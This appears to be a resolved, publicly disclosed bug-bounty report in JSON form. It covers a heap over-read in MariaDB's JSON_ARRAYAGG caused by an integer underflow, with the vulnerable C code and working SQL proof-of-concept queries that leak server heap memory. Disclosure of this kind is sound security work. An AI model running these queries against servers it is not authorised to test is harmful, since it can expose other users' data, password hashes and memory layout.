@@ -1,0 +1,108 @@
+{
+  "id": 3771139,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzcxMTM5",
+  "url": "https://hackerone.com/reports/3771139",
+  "title": "Heap Memory Disclosure via Integer Underflow in Item_func_json_arrayagg::cut_max_length in MariaDB Server",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-30T10:30:47.690Z",
+  "submitted_at": "2026-05-30T10:30:47.989Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukas_kupczyk",
+    "url": "/lukas_kupczyk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-15T09:38:49.127Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-15T08:05:00.353Z",
+  "team_member_agreed_on_going_public_at": "2026-09-15T09:38:48.619Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:** \n\nAn integer underflow in MariaDB's `JSON_ARRAYAGG` aggregate function allows any authenticated user to read arbitrary heap memory from the server process. When using a single-byte character set (latin1, binary, or ascii), the `Item_func_json_arrayagg::cut_max_length` override subtracts 1 from `max_length` to reserve space for a closing `\"` before calling the base class `Item_func_group_concat::cut_max_length(result, old_length, max_length-1)`. It does not verify that `old_length <= max_length-1` first. When `old_length >= max_length` (which occurs when the accumulated result has already reached or exceeded `group_concat_max_len` before the current row is appended), the base class computes a `Well_formed_prefix` with `end` pointer before `start` pointer. Inside `my_well_formed_char_length_8bit`, the subtraction `(size_t)(end - start)` wraps to a huge unsigned value, and `MIN(huge_value, result->length())` evaluates to `result->length()`. The string length is then set to `old_length + result->length()` — roughly double the real data size — via the unchecked `Binary_string::length(size_t)` setter, leaving `str_length` far beyond `Alloced_length`. When the result is serialised to the client (e.g. through `HEX()`), the protocol layer reads `str_length` bytes from the buffer, walking past the end of the heap chunk and disclosing the contents of adjacent allocations.\n\nThe vulnerability was introduced in commit 6c573a9146caa76807db1190e0747f5befb5b170 (2020-06-15, \"MDEV-22844 JSON\\_ARRAYAGG is limited by group\\_concat\\_max\\_len\"). Versions prior to 10.5.4 are not affected because `JSON_ARRAYAGG`'s `cut_max_length` override did not exist.\n\nThe vulnerable code in `sql/item_jsonfunc.cc`:\n\n```c\nvoid Item_func_json_arrayagg::cut_max_length(String *result,\n       uint old_length, uint max_length) const\n{\n  if (result->length() == 0)\n    return;\n  if (result->ptr()[result->length() - 1] != '\"' || max_length == 0)\n  {\n    Item_func_group_concat::cut_max_length(result, old_length, max_length);\n    return;\n  }\n  Item_func_group_concat::cut_max_length(result, old_length, max_length-1);\n  result->append('\"');\n}\n```\n\nThe base class function in `sql/item_sum.cc`:\n\n```c\nvoid Item_func_group_concat::cut_max_length(String *result,\n        uint old_length, uint max_length) const\n{\n  const char *ptr= result->ptr();\n  size_t add_length= Well_formed_prefix(collation.collation,\n                                      ptr + old_length,    // start\n                                      ptr + max_length,    // end < start when underflow\n                                      result->length()).length();\n  result->length(old_length + add_length);\n}\n```\n\nThe unsigned wraparound in `strings/ctype-simple.c`:\n\n```c\nsize_t my_well_formed_char_length_8bit(...)\n{\n  size_t nbytes= (size_t) (end - start); // wraps to ~SIZE_MAX when end < start\n  size_t res= MY_MIN(nbytes, nchars);    // = nchars = result->length()\n  return res;\n}\n```\n\n**Reproduction Steps:** \n\nAny authenticated connection to MariaDB \\>= 10.5.4 with the `SELECT` and `CREATE TEMPORARY TABLES` privileges can trigger the disclosure; `group_concat_max_len` is SESSION-scoped and requires no additional grant.\n\n```sql\n-- Small leak (group_concat_max_len = 9)\nSET SESSION group_concat_max_len = 9;\nCREATE TEMPORARY TABLE t (c VARCHAR(20) CHARACTER SET latin1);\nINSERT INTO t VALUES ('ab'), ('cd'), ('ef');\nSELECT LENGTH(JSON_ARRAYAGG(c ORDER BY c)) AS result_length,\n       HEX(JSON_ARRAYAGG(c ORDER BY c)) AS hex_result FROM t;\nDROP TEMPORARY TABLE t;\n\n-- Larger leak (group_concat_max_len = 100)\nSET @N = 100;\nSET SESSION group_concat_max_len = @N;\nCREATE TEMPORARY TABLE t (c MEDIUMTEXT CHARACTER SET latin1);\nINSERT INTO t VALUES (REPEAT('a', @N - 2)), ('x');\nSELECT LENGTH(JSON_ARRAYAGG(c ORDER BY c)) AS got_bytes,\n       @N + 2 AS expected_sane_bytes,\n       HEX(SUBSTR(JSON_ARRAYAGG(c ORDER BY c), @N + 2)) AS leaked_heap FROM t;\nDROP TEMPORARY TABLE t;\n```\n\nThe first query returns a `result_length` significantly larger than the expected JSON output (\\~10 bytes), with the excess bytes visible as non-JSON hex data. The second query explicitly isolates the leaked heap bytes beyond the expected result boundary.\n\n## Impact\n\nAny authenticated user with the default `SELECT` and `CREATE TEMPORARY TABLES` privileges can read adjacent heap memory from the `mariadbd` process. Disclosed contents can include other sessions' query data (PII, credentials), `mysql.user` password hashes from the ACL cache, and glibc allocator/`THD` pointers usable for ASLR defeat in an exploit chain. The over-read returns roughly 2–3× `group_concat_max_len` per query and does not crash the server, so it can be repeated silently and indefinitely.",
+  "weakness": {
+    "id": 9,
+    "name": "Buffer Over-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-15T08:05:00.469Z",
+  "allow_singular_disclosure_after": 2582051.560721478,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
